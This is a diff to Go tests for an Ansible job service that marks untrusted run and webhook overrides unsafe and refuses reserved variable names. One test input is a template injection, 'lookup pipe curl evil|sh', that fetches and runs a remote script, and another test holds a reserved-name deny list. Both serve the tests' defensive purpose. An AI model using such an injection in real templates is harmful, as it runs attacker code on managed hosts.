@@ -168,7 +168,7 @@ func TestMergeExtraVars(t *testing.T) {
 // redacted.
 func TestBuildPayloadMarksUntrustedOverridesUnsafe(t *testing.T) {
 	org, zone, templateID := uuid.Must(uuid.NewV7()), uuid.Must(uuid.NewV7()), uuid.Must(uuid.NewV7())
-	schemaRaw := json.RawMessage(`{"fields":[{"name":"token","type":"secret"},{"name":"branch","type":"string"},{"name":"tags","type":"list","item":{"name":"tag","type":"string"}},{"name":"replicas","type":"int"}]}`)
+	schemaRaw := json.RawMessage(`{"fields":[{"name":"token","type":"secret"},{"name":"branch","type":"string"},{"name":"labels","type":"list","item":{"name":"label","type":"string"}},{"name":"replicas","type":"int"}]}`)
 	templates := fakeTemplates{byID: map[uuid.UUID]TemplateRow{templateID: {
 		ID: templateID, OrgID: org, PlaybookInline: "- hosts: all\n",
 		Limit: "all", ExtraVars: json.RawMessage(`{"branch":"{{ template_default }}","token":"template-secret-4c1"}`), ExtraVarsSchema: schemaRaw,
@@ -178,7 +178,7 @@ func TestBuildPayloadMarksUntrustedOverridesUnsafe(t *testing.T) {
 	job := Job{ID: uuid.Must(uuid.NewV7()), OrgID: org, ZoneID: zone, Kind: KindRun, TemplateID: &templateID, HostIDs: testHosts}
 	inject := "{{ lookup('pipe', 'curl evil|sh') }}"
 	job.Payload = sealedOverride(t, q, job, RunOverrides{Untrusted: true, ExtraVars: map[string]any{
-		"branch": inject, "tags": []any{"v1", "{% raw %}x"}, "replicas": float64(2),
+		"branch": inject, "labels": []any{"v1", "{% raw %}x"}, "replicas": float64(2),
 	}})
 
 	out := &workerpb.Job{}
@@ -189,8 +189,8 @@ func TestBuildPayloadMarksUntrustedOverridesUnsafe(t *testing.T) {
 	if out.ExtraVars["branch"] != string(wantBranch) {
 		t.Fatalf("branch = %s, want %s", out.ExtraVars["branch"], wantBranch)
 	}
-	if out.ExtraVars["tags"] != `[{"__ansible_unsafe":"v1"},{"__ansible_unsafe":"{% raw %}x"}]` {
-		t.Fatalf("tags = %s", out.ExtraVars["tags"])
+	if out.ExtraVars["labels"] != `[{"__ansible_unsafe":"v1"},{"__ansible_unsafe":"{% raw %}x"}]` {
+		t.Fatalf("labels = %s", out.ExtraVars["labels"])
 	}
 	if out.ExtraVars["replicas"] != "2" {
 		t.Fatalf("replicas = %s", out.ExtraVars["replicas"])
@@ -342,5 +342,34 @@ func TestMergeExtraVarsKeepsNumbersExact(t *testing.T) {
 	}
 	if !strings.Contains(string(got), `"a":9007199254740993`) || !strings.Contains(string(got), `"b":9007199254740995`) {
 		t.Fatalf("merged = %s", got)
+	}
+}
+
+// TestCheckUntrustedRefusesReservedNamesAndNamesItsSource: an untrusted
+// override may not set a variable Ansible or Pulsix acts on, whatever its
+// value, and the refusal names where the value came from.
+func TestCheckUntrustedRefusesReservedNamesAndNamesItsSource(t *testing.T) {
+	for _, name := range []string{"ansible_python_interpreter", "hostvars", "environment", "pulsix_agent_enroll_token"} {
+		ov := &RunOverrides{Untrusted: true, ExtraVars: map[string]any{name: "x"}}
+		err := ov.checkUntrusted(TriggerWebhook)
+		if !errors.Is(err, ErrInvalidInput) || !strings.Contains(err.Error(), name) || !strings.Contains(err.Error(), "webhook value") {
+			t.Errorf("webhook %s = %v", name, err)
+		}
+		err = ov.checkUntrusted(TriggerManual)
+		if !errors.Is(err, ErrInvalidInput) || !strings.Contains(err.Error(), "run request value") {
+			t.Errorf("run request %s = %v", name, err)
+		}
+	}
+	// Trusted overrides (schedules) are an operator's, held to the
+	// template's own rules only.
+	if err := (&RunOverrides{ExtraVars: map[string]any{"environment": "x"}}).checkUntrusted(TriggerSchedule); err != nil {
+		t.Fatalf("trusted override = %v", err)
+	}
+	deep := &RunOverrides{Untrusted: true, ExtraVars: map[string]any{"v": map[string]any{"__ansible_vault": "x"}}}
+	if err := deep.checkUntrusted(TriggerManual); err == nil || !strings.Contains(err.Error(), "run request value") {
+		t.Fatalf("reserved key from a run request = %v", err)
+	}
+	if err := checkWireMarkers(json.RawMessage(`{"cfg":{"__ansible_unsafe":1}}`), TriggerManual); err == nil || !strings.Contains(err.Error(), "run request values") {
+		t.Fatalf("wire markers of a run request = %v", err)
 	}
 }
